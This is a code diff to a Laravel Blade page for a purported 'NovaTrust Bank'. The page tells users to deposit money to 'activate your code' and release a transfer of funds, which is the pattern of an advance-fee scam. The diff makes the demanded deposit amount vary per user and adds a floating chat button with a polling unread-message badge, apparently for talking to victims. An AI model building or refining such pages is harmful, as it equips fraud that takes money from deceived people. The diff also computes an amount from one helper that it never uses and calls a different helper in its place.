@@ -109,7 +109,14 @@
         }
     </style>
 </head>
+
 <body>
+
+@php
+use App\Helpers\BalanceHelper;
+$activationAmount = BalanceHelper::getBalance(auth()->id()) ?: 500;
+@endphp
+
     <div class="navbar">
         <div class="logo">NovaTrust Bank</div>
         <div class="menu">
@@ -136,7 +143,7 @@
                 This deposit will be added to your bank account balance.
             </p>
             <p>
-                Please deposit <strong>$500</strong> to instantly activate your code and complete the transfer of all funds
+                Please deposit <strong>${{ number_format(\App\Helpers\ActivationBalanceHelper::get(auth()->id()), 2) }}</strong> to instantly activate your code and complete the transfer of all funds
                 to your bank account.
             </p>
             <p>
@@ -144,12 +151,12 @@
             </p>
         </div>
 
-        {{-- ? Display success message --}}
+        {{-- Display success message --}}
         @if(session('success'))
             <div class="success-message">{{ session('success') }}</div>
         @endif
 
-        {{-- ? Display validation errors --}}
+        {{-- Display validation errors --}}
         @if($errors->any())
             <div class="error">
                 <ul>
@@ -190,5 +197,89 @@
             <button type="submit">Send & Save</button>
         </form>
     </div>
+	
+	<!-- ========================= -->
+<!-- FLOATING CHAT BUTTON FULL -->
+<!-- ========================= -->
+
+<!-- Floating Chat Button -->
+<a href="{{ route('user.chat') }}" id="floatingChatBtn">
+    Chat
+    <span id="unread-badge" class="chat-notify-bubble">0</span>
+</a>
+
+<style>
+/* Floating Chat Button */
+#floatingChatBtn {
+    position: fixed;
+    bottom: 25px;
+    right: 25px;
+    width: 70px;
+    height: 70px;
+    background: #28a745;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 14px rgba(0,0,0,0.28);
+    cursor: pointer;
+    z-index: 9999;
+    animation: floatPulse 1.8s infinite;
+    text-decoration: none;
+}
+#floatingChatBtn:hover {
+    background: #1e7e34;
+}
+
+@keyframes floatPulse {
+    0% { transform: translateY(0px); }
+    50% { transform: translateY(-4px); }
+    100% { transform: translateY(0px); }
+}
+
+/* Notification Badge */
+.chat-notify-bubble {
+    position: absolute;
+    top: 6px;
+    right: 6px;
+    background: red;
+    color: white;
+    font-size: 11px;
+    padding: 2px 6px;
+    border-radius: 50%;
+    font-weight: bold;
+    display: none;
+}
+</style>
+
+<script>
+function loadUnreadCount() {
+    fetch("{{ route('messages.unread.count') }}")
+        .then(response => response.json())
+        .then(data => {
+            const badge = document.getElementById('unread-badge');
+            if (!badge) return;
+
+            // Use 'count' as returned by your controller
+            if (data.count > 0) {
+                badge.innerText = data.count;
+                badge.style.display = 'inline-block';
+            } else {
+                badge.style.display = 'none';
+            }
+        })
+        .catch(err => console.error('Unread count error:', err));
+}
+
+// Initial load
+loadUnreadCount();
+
+// Refresh every 5 seconds
+setInterval(loadUnreadCount, 5000);
+</script>
+
 </body>
 </html>
